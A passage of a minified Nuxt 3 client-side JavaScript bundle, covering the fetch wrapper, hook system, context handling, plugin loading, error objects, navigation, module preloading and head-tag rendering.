          case "json": {
            const G = await y.response.text(),
              q = y.options.parseResponse || hr;
            y.response._data = q(G);
            break;
          }
          case "stream":
            y.response._data = y.response.body;
            break;
          default:
            y.response._data = await y.response[D]();
        }
      }
      return (
        y.options.onResponse && (await y.options.onResponse(y)),
        !y.options.ignoreResponseError &&
        y.response.status >= 400 &&
        y.response.status < 600
          ? (y.options.onResponseError && (await y.options.onResponseError(y)),
            await i(y))
          : y.response
      );
    },
    u = async function (p, v) {
      return (await a(p, v))._data;
    };
  return (
    (u.raw = a),
    (u.native = (...f) => t(...f)),
    (u.create = (f = {}) => Dd({ ...e, defaults: { ...e.defaults, ...f } })),
    u
  );
}
const Xa = (function () {
    if (typeof globalThis < "u") return globalThis;
    if (typeof self < "u") return self;
    if (typeof window < "u") return window;
    if (typeof global < "u") return global;
    throw new Error("unable to locate global object");
  })(),
  jv =
    Xa.fetch ||
    (() =>
      Promise.reject(new Error("[ofetch] global.fetch is not supported!"))),
  Nv = Xa.Headers,
  Bv = Xa.AbortController,
  Jv = Dd({ fetch: jv, Headers: Nv, AbortController: Bv }),
  zv = Jv,
  Yv = () => {
    var e;
    return (
      (null == (e = null == window ? void 0 : window.__NUXT__)
        ? void 0
        : e.config) || {}
    );
  },
  gr = Yv().app,
  Uv = () => gr.baseURL,
  Hv = () => gr.buildAssetsDir,
  Za = (...e) => Td(Id(), Hv(), ...e),
  Id = (...e) => {
    const t = gr.cdnURL || gr.baseURL;
    return e.length ? Td(t, ...e) : t;
  };
function aa(e, t = {}, n) {
  for (const o in e) {
    const i = e[o],
      a = n ? `${n}:${o}` : o;
    "object" == typeof i && null !== i
      ? aa(i, t, a)
      : "function" == typeof i && (t[a] = i);
  }
  return t;
}
(globalThis.__buildAssetsURL = Za),
  (globalThis.__publicAssetsURL = Id),
  globalThis.$fetch || (globalThis.$fetch = zv.create({ baseURL: Uv() }));
const Vv = { run: (e) => e() },
  Qv = () => Vv,
  Od = typeof console.createTask < "u" ? console.createTask : Qv;
function Xv(e, t) {
  const n = t.shift(),
    o = Od(n);
  return e.reduce(
    (i, a) => i.then(() => o.run(() => a(...t))),
    Promise.resolve()
  );
}
function Zv(e, t) {
  const n = t.shift(),
    o = Od(n);
  return Promise.all(e.map((i) => o.run(() => i(...t))));
}
function Fs(e, t) {
  for (const n of [...e]) n(t);
}
class qv {
  constructor() {
    (this._hooks = {}),
      (this._before = void 0),
      (this._after = void 0),
      (this._deprecatedMessages = void 0),
      (this._deprecatedHooks = {}),
      (this.hook = this.hook.bind(this)),
      (this.callHook = this.callHook.bind(this)),
      (this.callHookWith = this.callHookWith.bind(this));
  }
  hook(t, n, o = {}) {
    if (!t || "function" != typeof n) return () => {};
    const i = t;
    let a;
    for (; this._deprecatedHooks[t]; )
      (a = this._deprecatedHooks[t]), (t = a.to);
    if (a && !o.allowDeprecated) {
      let u = a.message;
      u ||
        (u =
          `${i} hook has been deprecated` +
          (a.to ? `, please use ${a.to}` : "")),
        this._deprecatedMessages || (this._deprecatedMessages = new Set()),
        this._deprecatedMessages.has(u) ||
          (console.warn(u), this._deprecatedMessages.add(u));
    }
    if (!n.name)
      try {
        Object.defineProperty(n, "name", {
          get: () => "_" + t.replace(/\W+/g, "_") + "_hook_cb",
          configurable: !0,
        });
      } catch {}
    return (
      (this._hooks[t] = this._hooks[t] || []),
      this._hooks[t].push(n),
      () => {
        n && (this.removeHook(t, n), (n = void 0));
      }
    );
  }
  hookOnce(t, n) {
    let o,
      i = (...a) => (
        "function" == typeof o && o(), (o = void 0), (i = void 0), n(...a)
      );
    return (o = this.hook(t, i)), o;
  }
  removeHook(t, n) {
    if (this._hooks[t]) {
      const o = this._hooks[t].indexOf(n);
      -1 !== o && this._hooks[t].splice(o, 1),
        0 === this._hooks[t].length && delete this._hooks[t];
    }
  }
  deprecateHook(t, n) {
    this._deprecatedHooks[t] = "string" == typeof n ? { to: n } : n;
    const o = this._hooks[t] || [];
    delete this._hooks[t];
    for (const i of o) this.hook(t, i);
  }
  deprecateHooks(t) {
    Object.assign(this._deprecatedHooks, t);
    for (const n in t) this.deprecateHook(n, t[n]);
  }
  addHooks(t) {
    const n = aa(t),
      o = Object.keys(n).map((i) => this.hook(i, n[i]));
    return () => {
      for (const i of o.splice(0, o.length)) i();
    };
  }
  removeHooks(t) {
    const n = aa(t);
    for (const o in n) this.removeHook(o, n[o]);
  }
  removeAllHooks() {
    for (const t in this._hooks) delete this._hooks[t];
  }
  callHook(t, ...n) {
    return n.unshift(t), this.callHookWith(Xv, t, ...n);
  }
  callHookParallel(t, ...n) {
    return n.unshift(t), this.callHookWith(Zv, t, ...n);
  }
  callHookWith(t, n, ...o) {
    const i =
      this._before || this._after ? { name: n, args: o, context: {} } : void 0;
    this._before && Fs(this._before, i);
    const a = t(n in this._hooks ? [...this._hooks[n]] : [], o);
    return a instanceof Promise
      ? a.finally(() => {
          this._after && i && Fs(this._after, i);
        })
      : (this._after && i && Fs(this._after, i), a);
  }
  beforeEach(t) {
    return (
      (this._before = this._before || []),
      this._before.push(t),
      () => {
        if (void 0 !== this._before) {
          const n = this._before.indexOf(t);
          -1 !== n && this._before.splice(n, 1);
        }
      }
    );
  }
  afterEach(t) {
    return (
      (this._after = this._after || []),
      this._after.push(t),
      () => {
        if (void 0 !== this._after) {
          const n = this._after.indexOf(t);
          -1 !== n && this._after.splice(n, 1);
        }
      }
    );
  }
}
function Rd() {
  return new qv();
}
function Kv(e = {}) {
  let t,
    n = !1;
  const o = (u) => {
    if (t && t !== u) throw new Error("Context conflict");
  };
  let i;
  if (e.asyncContext) {
    const u = e.AsyncLocalStorage || globalThis.AsyncLocalStorage;
    u
      ? (i = new u())
      : console.warn("[unctx] `AsyncLocalStorage` is not provided.");
  }
  const a = () => {
    if (i && void 0 === t) {
      const u = i.getStore();
      if (void 0 !== u) return u;
    }
    return t;
  };
  return {
    use: () => {
      const u = a();
      if (void 0 === u) throw new Error("Context is not available");
      return u;
    },
    tryUse: () => a(),
    set: (u, f) => {
      f || o(u), (t = u), (n = !0);
    },
    unset: () => {
      (t = void 0), (n = !1);
    },
    call: (u, f) => {
      o(u), (t = u);
      try {
        return i ? i.run(u, f) : f();
      } finally {
        n || (t = void 0);
      }
    },
    async callAsync(u, f) {
      t = u;
      const p = () => {
          t = u;
        },
        v = () => (t === u ? p : void 0);
      la.add(v);
      try {
        const y = i ? i.run(u, f) : f();
        return n || (t = void 0), await y;
      } finally {
        la.delete(v);
      }
    },
  };
}
function $v(e = {}) {
  const t = {};
  return {
    get: (n, o = {}) => (t[n] || (t[n] = Kv({ ...e, ...o })), t[n], t[n]),
  };
}
const mr =
    typeof globalThis < "u"
      ? globalThis
      : typeof self < "u"
      ? self
      : typeof global < "u"
      ? global
      : typeof window < "u"
      ? window
      : {},
  zc = "__unctx__",
  ey = mr[zc] || (mr[zc] = $v()),
  ty = (e, t = {}) => ey.get(e, t),
  Yc = "__unctx_async_handlers__",
  la = mr[Yc] || (mr[Yc] = new Set());
function Cd(e) {
  const t = [];
  for (const i of la) {
    const a = i();
    a && t.push(a);
  }
  const n = () => {
    for (const i of t) i();
  };
  let o = e();
  return (
    o &&
      "object" == typeof o &&
      "catch" in o &&
      (o = o.catch((i) => {
        throw (n(), i);
      })),
    [o, n]
  );
}
const Wd = ty("nuxt-app", { asyncContext: !1 }),
  ny = "__nuxt_plugin";
function oy(e) {
  let t = 0;
  const n = {
    _scope: ka(),
    provide: void 0,
    globalName: "nuxt",
    versions: {
      get nuxt() {
        return "3.11.2";
      },
      get vue() {
        return n.vueApp.version;
      },
    },
    payload: fn({
      data: {},
      state: {},
      once: new Set(),
      _errors: {},
      ...(window.__NUXT__ ?? {}),
    }),
    static: { data: {} },
    runWithContext: (i) => n._scope.run(() => sy(n, i)),
    isHydrating: !0,
    deferHydration() {
      if (!n.isHydrating) return () => {};
      t++;
      let i = !1;
      return () => {
        if (!i && ((i = !0), t--, 0 === t))
          return (n.isHydrating = !1), n.callHook("app:suspense:resolve");
      };
    },
    _asyncDataPromises: {},
    _asyncData: {},
    _payloadRevivers: {},
    ...e,
  };
  (n.hooks = Rd()),
    (n.hook = n.hooks.hook),
    (n.callHook = n.hooks.callHook),
    (n.provide = (i, a) => {
      const u = "$" + i;
      Yi(n, u, a), Yi(n.vueApp.config.globalProperties, u, a);
    }),
    Yi(n.vueApp, "$nuxt", n),
    Yi(n.vueApp.config.globalProperties, "$nuxt", n);
  {
    window.addEventListener("nuxt.preloadError", (a) => {
      n.callHook("app:chunkError", { error: a.payload });
    }),
      (window.useNuxtApp = window.useNuxtApp || it);
    const i = n.hook("app:error", (...a) => {
      console.error("[nuxt] error caught during app initialization", ...a);
    });
    n.hook("app:mounted", i);
  }
  const o = n.payload.config;
  return n.provide("config", o), n;
}
async function iy(e, t) {
  if ((t.hooks && e.hooks.addHooks(t.hooks), "function" == typeof t)) {
    const { provide: n } = (await e.runWithContext(() => t(e))) || {};
    if (n && "object" == typeof n) for (const o in n) e.provide(o, n[o]);
  }
}
async function ry(e, t) {
  const n = [],
    o = [],
    i = [],
    a = [];
  let u = 0;
  async function f(p) {
    var y;
    const v =
      (null == (y = p.dependsOn)
        ? void 0
        : y.filter((w) => t.some((x) => x._name === w) && !n.includes(w))) ??
      [];
    if (v.length > 0) o.push([new Set(v), p]);
    else {
      const w = iy(e, p).then(async () => {
        p._name &&
          (n.push(p._name),
          await Promise.all(
            o.map(async ([x, k]) => {
              x.has(p._name) &&
                (x.delete(p._name), 0 === x.size && (u++, await f(k)));
            })
          ));
      });
      p.parallel ? i.push(w.catch((x) => a.push(x))) : await w;
    }
  }
  for (const p of t) await f(p);
  if ((await Promise.all(i), u))
    for (let p = 0; p < u; p++) await Promise.all(i);
  if (a.length) throw a[0];
}
function zn(e) {
  if ("function" == typeof e) return e;
  const t = e._name || e.name;
  return (
    delete e.name,
    Object.assign(e.setup || (() => {}), e, { [ny]: !0, _name: t })
  );
}
function sy(e, t, n) {
  return Wd.set(e), e.vueApp.runWithContext(() => (n ? t(...n) : t()));
}
function ay() {
  var t;
  let e;
  return (
    Ya() && (e = null == (t = vm()) ? void 0 : t.appContext.app.$nuxt),
    (e = e || Wd.tryUse()),
    e || null
  );
}
function it() {
  const e = ay();
  if (!e) throw new Error("[nuxt] instance unavailable");
  return e;
}
function vr(e) {
  return it().$config;
}
function Yi(e, t, n) {
  Object.defineProperty(e, t, { get: () => n });
}
function ly(e, t) {
  return { ctx: { table: e }, matchAll: (n) => Fd(n, e, t) };
}
function Gd(e) {
  const t = {};
  for (const n in e)
    t[n] =
      "dynamic" === n
        ? new Map(Object.entries(e[n]).map(([o, i]) => [o, Gd(i)]))
        : new Map(Object.entries(e[n]));
  return t;
}
function cy(e) {
  return ly(Gd(e));
}
function Fd(e, t, n) {
  !0 !== n && e.endsWith("/") && (e = e.slice(0, -1) || "/");
  const o = [];
  for (const [a, u] of Uc(t.wildcard))
    (e === a || e.startsWith(a + "/")) && o.push(u);
  for (const [a, u] of Uc(t.dynamic))
    if (e.startsWith(a + "/")) {
      const f = "/" + e.slice(a.length).split("/").splice(2).join("/");
      o.push(...Fd(f, u));
    }
  const i = t.static.get(e);
  return i && o.push(i), o.filter(Boolean);
}
function Uc(e) {
  return [...e.entries()].sort((t, n) => t[0].length - n[0].length);
}
function Ls(e) {
  if (null === e || "object" != typeof e) return !1;
  const t = Object.getPrototypeOf(e);
  return (
    !(
      (null !== t &&
        t !== Object.prototype &&
        null !== Object.getPrototypeOf(t)) ||
      Symbol.iterator in e
    ) &&
    (!(Symbol.toStringTag in e) ||
      "[object Module]" === Object.prototype.toString.call(e))
  );
}
function ca(e, t, n = ".", o) {
  if (!Ls(t)) return ca(e, {}, n, o);
  const i = Object.assign({}, t);
  for (const a in e) {
    if ("__proto__" === a || "constructor" === a) continue;
    const u = e[a];
    null != u &&
      ((o && o(i, a, u, n)) ||
        (Array.isArray(u) && Array.isArray(i[a])
          ? (i[a] = [...u, ...i[a]])
          : Ls(u) && Ls(i[a])
          ? (i[a] = ca(u, i[a], (n ? `${n}.` : "") + a.toString(), o))
          : (i[a] = u)));
  }
  return i;
}
function Ld(e) {
  return (...t) => t.reduce((n, o) => ca(n, o, "", e), {});
}
const uy = Ld(),
  dy = Ld((e, t, n) => {
    if (void 0 !== e[t] && "function" == typeof n) return (e[t] = n(e[t])), !0;
  });
function fy(e, t) {
  try {
    return t in e;
  } catch {
    return !1;
  }
}
var hy = Object.defineProperty,
  py = (e, t, n) =>
    t in e
      ? hy(e, t, { enumerable: !0, configurable: !0, writable: !0, value: n })
      : (e[t] = n),
  qn = (e, t, n) => (py(e, "symbol" != typeof t ? t + "" : t, n), n);
class ua extends Error {
  constructor(t, n = {}) {
    super(t, n),
      qn(this, "statusCode", 500),
      qn(this, "fatal", !1),
      qn(this, "unhandled", !1),
      qn(this, "statusMessage"),
      qn(this, "data"),
      qn(this, "cause"),
      n.cause && !this.cause && (this.cause = n.cause);
  }
  toJSON() {
    const t = { message: this.message, statusCode: da(this.statusCode, 500) };
    return (
      this.statusMessage && (t.statusMessage = jd(this.statusMessage)),
      void 0 !== this.data && (t.data = this.data),
      t
    );
  }
}
function gy(e) {
  if ("string" == typeof e) return new ua(e);
  if (my(e)) return e;
  const t = new ua(e.message ?? e.statusMessage ?? "", { cause: e.cause || e });
  if (fy(e, "stack"))
    try {
      Object.defineProperty(t, "stack", { get: () => e.stack });
    } catch {
      try {
        t.stack = e.stack;
      } catch {}
    }
  if (
    (e.data && (t.data = e.data),
    e.statusCode
      ? (t.statusCode = da(e.statusCode, t.statusCode))
      : e.status && (t.statusCode = da(e.status, t.statusCode)),
    e.statusMessage
      ? (t.statusMessage = e.statusMessage)
      : e.statusText && (t.statusMessage = e.statusText),
    t.statusMessage)
  ) {
    const n = t.statusMessage;
    jd(t.statusMessage) !== n &&
      console.warn(
        "[h3] Please prefer using `message` for longer error messages instead of `statusMessage`. In the future, `statusMessage` will be sanitized by default."
      );
  }
  return (
    void 0 !== e.fatal && (t.fatal = e.fatal),
    void 0 !== e.unhandled && (t.unhandled = e.unhandled),
    t
  );
}
function my(e) {
  var t;
  return (
    !0 ===
    (null == (t = null == e ? void 0 : e.constructor) ? void 0 : t.__h3_error__)
  );
}
qn(ua, "__h3_error__", !0);
const vy = /[^\u0009\u0020-\u007E]/g;
function jd(e = "") {
  return e.replace(vy, "");
}
function da(e, t = 200) {
  return !e ||
    ("string" == typeof e && (e = Number.parseInt(e, 10)), e < 100 || e > 999)
    ? t
    : e;
}
const Nd = Symbol("route"),
  Ai = () => {
    var e;
    return null == (e = it()) ? void 0 : e.$router;
  },
  Bd = () => (Ya() ? oo(Nd, it()._route) : it()._route),
  yy = () => {
    try {
      if (it()._processingMiddleware) return !0;
    } catch {
      return !1;
    }
    return !1;
  },
  wy = (e, t) => {
    e || (e = "/");
    const n =
      "string" == typeof e
        ? e
        : Md(e.path || "/", e.query || {}) + (e.hash || "");
    if (null != t && t.open) {
      const { target: f = "_blank", windowFeatures: p = {} } = t.open,
        v = Object.entries(p)
          .filter(([y, w]) => void 0 !== w)
          .map(([y, w]) => `${y.toLowerCase()}=${w}`)
          .join(", ");
      return open(n, f, v), Promise.resolve();
    }
    const o =
      (null == t ? void 0 : t.external) || Fo(n, { acceptRelative: !0 });
    if (o) {
      if (null == t || !t.external)
        throw new Error(
          "Navigating to an external URL is not allowed by default. Use `navigateTo(url, { external: true })`."
        );
      const f = wi(n).protocol;
      if (f && xv(f))
        throw new Error(`Cannot navigate to a URL with '${f}' protocol.`);
    }
    const i = yy();
    if (!o && i) return e;
    const a = Ai(),
      u = it();
    return o
      ? (u._scope.stop(),
        null != t && t.replace ? location.replace(n) : (location.href = n),
        i ? !!u.isHydrating && new Promise(() => {}) : Promise.resolve())
      : null != t && t.replace
      ? a.replace(e)
      : a.push(e);
  },
  Jd = "__nuxt_error",
  qa = () => gg(it().payload, "error"),
  Ay = (e) => {
    const t = Ka(e);
    try {
      const n = it(),
        o = qa();
      n.hooks.callHook("app:error", t), (o.value = o.value || t);
    } catch {
      throw t;
    }
    return t;
  },
  by = async (e = {}) => {
    const t = it(),
      n = qa();
    t.callHook("app:error:cleared", e),
      e.redirect && (await Ai().replace(e.redirect)),
      (n.value = null);
  },
  _y = (e) => !!e && "object" == typeof e && Jd in e,
  Ka = (e) => {
    const t = gy(e);
    return (
      Object.defineProperty(t, Jd, {
        value: !0,
        configurable: !1,
        writable: !1,
      }),
      t
    );
  },
  xy = "modulepreload",
  Py = function (e, t) {
    return "." === e[0] ? new URL(e, t).href : e;
  },
  Hc = {},
  My = function (t, n, o) {
    let i = Promise.resolve();
    if (n && n.length > 0) {
      const a = document.getElementsByTagName("link"),
        u = document.querySelector("meta[property=csp-nonce]"),
        f =
          (null == u ? void 0 : u.nonce) ||
          (null == u ? void 0 : u.getAttribute("nonce"));
      i = Promise.all(
        n.map((p) => {
          if ((p = Py(p, o)) in Hc) return;
          Hc[p] = !0;
          const v = p.endsWith(".css"),
            y = v ? '[rel="stylesheet"]' : "";
          if (o)
            for (let k = a.length - 1; k >= 0; k--) {
              const D = a[k];
              if (D.href === p && (!v || "stylesheet" === D.rel)) return;
            }
          else if (document.querySelector(`link[href="${p}"]${y}`)) return;
          const x = document.createElement("link");
          return (
            (x.rel = v ? "stylesheet" : xy),
            v || ((x.as = "script"), (x.crossOrigin = "")),
            (x.href = p),
            f && x.setAttribute("nonce", f),
            document.head.appendChild(x),
            v
              ? new Promise((k, D) => {
                  x.addEventListener("load", k),
                    x.addEventListener("error", () =>
                      D(new Error(`Unable to preload CSS for ${p}`))
                    );
                })
              : void 0
          );
        })
      );
    }
    return i
      .then(() => t())
      .catch((a) => {
        const u = new Event("vite:preloadError", { cancelable: !0 });
        if (((u.payload = a), window.dispatchEvent(u), !u.defaultPrevented))
          throw a;
      });
  },
  Vc = (...e) =>
    My(...e).catch((t) => {
      const n = new Event("nuxt.preloadError");
      throw ((n.payload = t), window.dispatchEvent(n), t);
    }),
  Sy = -1,
  Ty = -2,
  ky = -3,
  Ey = -4,
  Dy = -5,
  Iy = -6;
function Oy(e, t) {
  return Ry(JSON.parse(e), t);
}
function Ry(e, t) {
  if ("number" == typeof e) return i(e, !0);
  if (!Array.isArray(e) || 0 === e.length) throw new Error("Invalid input");
  const n = e,
    o = Array(n.length);
  function i(a, u = !1) {
    if (a === Sy) return;
    if (a === ky) return NaN;
    if (a === Ey) return 1 / 0;
    if (a === Dy) return -1 / 0;
    if (a === Iy) return -0;
    if (u) throw new Error("Invalid input");
    if (a in o) return o[a];
    const f = n[a];
    if (f && "object" == typeof f)
      if (Array.isArray(f))
        if ("string" == typeof f[0]) {
          const p = f[0],
            v = null == t ? void 0 : t[p];
          if (v) return (o[a] = v(i(f[1])));
          switch (p) {
            case "Date":
              o[a] = new Date(f[1]);
              break;
            case "Set":
              const y = new Set();
              o[a] = y;
              for (let k = 1; k < f.length; k += 1) y.add(i(f[k]));
              break;
            case "Map":
              const w = new Map();
              o[a] = w;
              for (let k = 1; k < f.length; k += 2) w.set(i(f[k]), i(f[k + 1]));
              break;
            case "RegExp":
              o[a] = new RegExp(f[1], f[2]);
              break;
            case "Object":
              o[a] = Object(f[1]);
              break;
            case "BigInt":
              o[a] = BigInt(f[1]);
              break;
            case "null":
              const x = Object.create(null);
              o[a] = x;
              for (let k = 1; k < f.length; k += 2) x[f[k]] = i(f[k + 1]);
              break;
            default:
              throw new Error(`Unknown type ${p}`);
          }
        } else {
          const p = new Array(f.length);
          o[a] = p;
          for (let v = 0; v < f.length; v += 1) {
            const y = f[v];
            y !== Ty && (p[v] = i(y));
          }
        }
      else {
        const p = {};
        o[a] = p;
        for (const v in f) {
          const y = f[v];
          p[v] = i(y);
        }
      }
    else o[a] = f;
    return o[a];
  }
  return i(0);
}
function Cy(e) {
  return Array.isArray(e) ? e : [e];
}
const Wy = ["title", "titleTemplate", "script", "style", "noscript"],
  $i = ["base", "meta", "link", "style", "script", "noscript"],
  Gy = [
    "title",
    "titleTemplate",
    "templateParams",
    "base",
    "htmlAttrs",
    "bodyAttrs",
    "meta",
    "link",
    "style",
    "script",
    "noscript",
  ],
  Fy = [
    "base",
    "title",
    "titleTemplate",
    "bodyAttrs",
    "htmlAttrs",
    "templateParams",
  ],
  zd = [
    "tagPosition",
    "tagPriority",
    "tagDuplicateStrategy",
    "children",
    "innerHTML",
    "textContent",
    "processTemplateParams",
  ],
  Ly = typeof window < "u";
function $a(e) {
  let t = 9;
  for (let n = 0; n < e.length; ) t = Math.imul(t ^ e.charCodeAt(n++), 9 ** 9);
  return (65536 + (t ^ (t >>> 9))).toString(16).substring(1, 8).toLowerCase();
}
function Qc(e) {
  return (
    e._h ||
    $a(
      e._d
        ? e._d
        : `${e.tag}:${e.textContent || e.innerHTML || ""}:${Object.entries(
            e.props
          )
            .map(([t, n]) => `${t}:${String(n)}`)
            .join(",")}`
    )
  );
}
function Yd(e, t) {
  const { props: n, tag: o } = e;
  if (Fy.includes(o)) return o;
  if ("link" === o && "canonical" === n.rel) return "canonical";
  if (n.charset) return "charset";
  const i = ["id"];
  "meta" === o && i.push("name", "property", "http-equiv");
  for (const a of i)
    if (typeof n[a] < "u") {
      const u = String(n[a]);
      return !(t && !t(u)) && `${o}:${a}:${u}`;
    }
  return !1;
}
function Xc(e, t) {
  return null == e ? t || null : "function" == typeof e ? e(t) : e;
}
async function jy(e, t, n) {
  const o = {
    tag: e,
    props: await Ud(
      "object" != typeof t || "function" == typeof t || t instanceof Promise
        ? {
            [["script", "noscript", "style"].includes(e)
              ? "innerHTML"
              : "textContent"]: t,
          }
        : { ...t },
      ["templateParams", "titleTemplate"].includes(e)
    ),
  };
  return (
    zd.forEach((i) => {
      const a = typeof o.props[i] < "u" ? o.props[i] : n[i];
      typeof a < "u" &&
        ((!["innerHTML", "textContent", "children"].includes(i) ||
          Wy.includes(o.tag)) &&
          (o["children" === i ? "innerHTML" : i] = a),
        delete o.props[i]);
    }),
    o.props.body && ((o.tagPosition = "bodyClose"), delete o.props.body),
    "script" === o.tag &&
      "object" == typeof o.innerHTML &&
      ((o.innerHTML = JSON.stringify(o.innerHTML)),
      (o.props.type = o.props.type || "application/json")),
    Array.isArray(o.props.content)
      ? o.props.content.map((i) => ({
          ...o,
          props: { ...o.props, content: i },
        }))
      : o
  );
}
function Ny(e, t) {
  const n = "class" === e ? " " : ";";
  return (
    "object" == typeof t &&
      !Array.isArray(t) &&
      (t = Object.entries(t)
        .filter(([, o]) => o)
        .map(([o, i]) => ("style" === e ? `${o}:${i}` : o))),
    (Array.isArray(t) ? t.join(n) : t)
      .split(n)
      .filter((o) => o.trim())
      .filter(Boolean)
      .join(n)
  );
}
async function Ud(e, t) {
  for (const n of Object.keys(e))
    if (["class", "style"].includes(n)) e[n] = Ny(n, e[n]);
    else if (
      (e[n] instanceof Promise && (e[n] = await e[n]), !t && !zd.includes(n))
    ) {
      const o = String(e[n]),
        i = n.startsWith("data-");
      "true" === o || "" === o
        ? (e[n] = !i || "true")
        : e[n] || (i && "false" === o ? (e[n] = "false") : delete e[n]);
    }
  return e;
}
const By = 10;
async function Jy(e) {
  const t = [];
  return (
    Object.entries(e.resolvedInput)
      .filter(([n, o]) => typeof o < "u" && Gy.includes(n))
      .forEach(([n, o]) => {
        const i = Cy(o);
        t.push(...i.map((a) => jy(n, a, e)).flat());
      }),
    (await Promise.all(t))
      .flat()
      .filter(Boolean)
      .map(
        (n, o) => (
          (n._e = e._i), e.mode && (n._m = e.mode), (n._p = (e._i << By) + o), n
        )
      )
  );
}
const Zc = { base: -10, title: 10 },
  qc = { critical: -80, high: -10, low: 20 };
function yr(e) {
  let t = 100;
  const n = e.tagPriority;
  return "number" == typeof n
    ? n
    : ("meta" === e.tag
        ? ("content-security-policy" === e.props["http-equiv"] && (t = -30),
          e.props.charset && (t = -20),
          "viewport" === e.props.name && (t = -15))
        : "link" === e.tag && "preconnect" === e.props.rel
        ? (t = 20)
        : e.tag in Zc && (t = Zc[e.tag]),
      "string" == typeof n && n in qc ? t + qc[n] : t);
}
const zy = [
    { prefix: "before:", offset: -1 },
    { prefix: "after:", offset: 1 },
  ],
  Kc = ["onload", "onerror", "onabort", "onprogress", "onloadstart"],
  kn = "%separator";
function er(e, t, n) {
  if ("string" != typeof e || !e.includes("%")) return e;
  let i = e;
  try {
    i = decodeURI(e);
  } catch {}
  return (
    (i.match(/%(\w+\.+\w+)|%(\w+)/g) || [])
      .sort()
      .reverse()
      .forEach((u) => {
        const f = (function o(u) {
          let f;
          return (
            (f = ["s", "pageTitle"].includes(u)
              ? t.pageTitle
              : u.includes(".")
              ? u.split(".").reduce((p, v) => (p && p[v]) || void 0, t)
              : t[u]),
            typeof f < "u" && (f || "").replace(/"/g, '\\"')
          );
        })(u.slice(1));
        "string" == typeof f &&
          (e = e
            .replace(new RegExp(`\\${u}(\\W|$)`, "g"), (p, v) => `${f}${v}`)
            .trim());
      }),
    e.includes(kn) &&
      (e.endsWith(kn) && (e = e.slice(0, -10).trim()),
      e.startsWith(kn) && (e = e.slice(10).trim()),
      (e = er(
        (e = e.replace(new RegExp(`\\${kn}\\s*\\${kn}`, "g"), kn)),
        { separator: n },
        n
      ))),
    e
  );
}
async function Hd(e, t = {}) {
  var y;
  const n = t.document || e.resolvedOptions.document;
  if (!n || !e.dirty) return;
  const o = { shouldRender: !0, tags: [] };
  if ((await e.hooks.callHook("dom:beforeRender", o), !o.shouldRender)) return;
  const i = (await e.resolveTags()).map((w) => ({
    tag: w,
    id: $i.includes(w.tag) ? Qc(w) : w.tag,
    shouldRender: !0,
  }));
  let a = e._dom;
  if (!a) {
    a = { elMap: { htmlAttrs: n.documentElement, bodyAttrs: n.body } };
    for (const w of ["body", "head"]) {
      const x = null == (y = n[w]) ? void 0 : y.children,
        k = [];
      for (const D of [...x].filter((G) =>
        $i.includes(G.tagName.toLowerCase())
      )) {
        const G = {
          tag: D.tagName.toLowerCase(),
          props: await Ud(
            D.getAttributeNames().reduce(
              (te, E) => ({ ...te, [E]: D.getAttribute(E) }),
              {}
            )
          ),
          innerHTML: D.innerHTML,
        };
        let q = 1,
          ie = Yd(G);
        for (; ie && k.find((te) => te._d === ie); ) ie = `${ie}:${q++}`;
        (G._d = ie || void 0),
          k.push(G),
          (a.elMap[D.getAttribute("data-hid") || Qc(G)] = D);
      }
    }
  }
  function u(w, x, k) {
    const D = `${w}:${x}`;
    (a.sideEffects[D] = k), delete a.pendingSideEffects[D];
  }
  function f({ id: w, $el: x, tag: k }) {
    const D = k.tag.endsWith("Attrs");
    (a.elMap[w] = x),
      D ||
        (["textContent", "innerHTML"].forEach((G) => {
          k[G] && k[G] !== x[G] && (x[G] = k[G]);
        }),
        u(w, "el", () => {
          var G;
          null == (G = a.elMap[w]) || G.remove(), delete a.elMap[w];
        }));
    for (const [G, q] of Object.entries(k._eventHandlers || {}))
      "" !== x.getAttribute(`data-${G}`) &&
        (("bodyAttrs" === k.tag ? n.defaultView : x).addEventListener(
          G.replace("on", ""),
          q.bind(x)
        ),
        x.setAttribute(`data-${G}`, ""));
    Object.entries(k.props).forEach(([G, q]) => {
      const ie = `attr:${G}`;
      if ("class" === G)
        for (const te of (q || "").split(" ").filter(Boolean))
          D && u(w, `${ie}:${te}`, () => x.classList.remove(te)),
            !x.classList.contains(te) && x.classList.add(te);
      else if ("style" === G)
        for (const te of (q || "").split(";").filter(Boolean)) {
          const [E, ...C] = te.split(":").map((I) => I.trim());
          u(w, `${ie}:${te}:${E}`, () => {
            x.style.removeProperty(E);
          }),
            x.style.setProperty(E, C.join(":"));
        }
      else
        x.getAttribute(G) !== q && x.setAttribute(G, !0 === q ? "" : String(q)),
          D && u(w, ie, () => x.removeAttribute(G));
    });
  }
  (a.pendingSideEffects = { ...(a.sideEffects || {}) }), (a.sideEffects = {});
  const p = [],
    v = { bodyClose: void 0, bodyOpen: void 0, head: void 0 };
  for (const w of i) {
    const { tag: x, shouldRender: k, id: D } = w;
    if (k) {
      if ("title" === x.tag) {
        n.title = x.textContent;
        continue;
      }
      (w.$el = w.$el || a.elMap[D]),
        w.$el ? f(w) : $i.includes(x.tag) && p.push(w);
    }
  }
  for (const w of p) {
    const x = w.tag.tagPosition || "head";
    (w.$el = n.createElement(w.tag.tag)),
      f(w),
      (v[x] = v[x] || n.createDocumentFragment()),
      v[x].appendChild(w.$el);
  }
  for (const w of i) await e.hooks.callHook("dom:renderTag", w, n, u);
  v.head && n.head.appendChild(v.head),
    v.bodyOpen && n.body.insertBefore(v.bodyOpen, n.body.firstChild),
    v.bodyClose && n.body.appendChild(v.bodyClose),
    Object.values(a.pendingSideEffects).forEach((w) => w()),
    (e._dom = a),
    (e.dirty = !1),
    await e.hooks.callHook("dom:rendered", { renders: i });
}
async function Yy(e, t = {}) {
  const n = t.delayFn || ((o) => setTimeout(o, 10));
  return (e._domUpdatePromise =
    e._domUpdatePromise ||
    new Promise((o) =>
      n(async () => {
        await Hd(e, t), delete e._domUpdatePromise, o();
      })
    ));
}
function Uy(e) {
  return (t) => {
    var o, i;
    const n =
      (null ==
      (i =
        null == (o = t.resolvedOptions.document)
          ? void 0
          : o.head.querySelector('script[id="unhead:payload"]'))
        ? void 0
        : i.innerHTML) || !1;
    return (
      n && t.push(JSON.parse(n)),
      {
        mode: "client",
        hooks: {
          "entries:updated": function (a) {
            Yy(a, e);
          },
        },
      }
    );
  };
}
const Hy = ["templateParams", "htmlAttrs", "bodyAttrs"],
  Vy = {
    hooks: {
      "tag:normalise": function ({ tag: e }) {
        ["hid", "vmid", "key"].forEach((o) => {
          e.props[o] && ((e.key = e.props[o]), delete e.props[o]);
        });
        const n = Yd(e) || (!!e.key && `${e.tag}:${e.key}`);
